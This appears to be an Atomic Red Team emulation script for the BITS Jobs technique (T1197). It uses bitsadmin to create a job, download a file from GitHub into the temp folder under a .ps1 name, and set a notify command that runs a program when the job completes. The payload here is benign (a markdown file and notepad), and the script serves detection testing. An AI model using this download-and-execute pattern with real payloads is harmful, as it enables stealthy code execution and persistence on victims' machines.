bitsadmin.exe /create AtomicBITS
bitsadmin.exe /addfile AtomicBITS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md %temp%\bitsadmin3_flag.ps1
bitsadmin.exe /setnotifycmdline AtomicBITS C:\Windows\system32\notepad.exe NULL
bitsadmin.exe /resume AtomicBITS
ping -n 5 127.0.0.1 >nul 2>&1
bitsadmin.exe /complete AtomicBITS